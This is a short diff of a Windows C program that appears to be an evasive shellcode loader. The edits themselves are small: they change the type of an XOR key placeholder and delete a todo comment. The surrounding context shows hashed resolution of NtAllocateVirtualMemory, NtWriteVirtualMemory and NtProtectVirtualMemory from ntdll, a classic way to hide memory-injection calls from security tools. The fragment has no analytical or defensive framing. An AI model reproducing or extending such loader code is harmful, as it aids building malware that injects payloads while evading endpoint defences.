@@ -5,7 +5,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
     char path[MAX_PATH]; 
     int money = 3500;
-    WORD key = %XOR_KEY%;
+    uint16_t key = %XOR_KEY%;
     
     snprintf(path, MAX_PATH, "%s\\Documents\\bank_account.txt", getenv("USERPROFILE"));  
     printf("start");    
@@ -51,14 +51,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     DWORD old_protect = 0;
     HANDLE th;
     BOOL rv;
-
-    /* TAGS todo
-    FunctionHASH__functionNAME
-    */
-
-
-    
-
+  
     NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_ALLOC_HASH);
     NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, WRITE_MEMORY_HASH);
     NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_PROTECT_HASH);
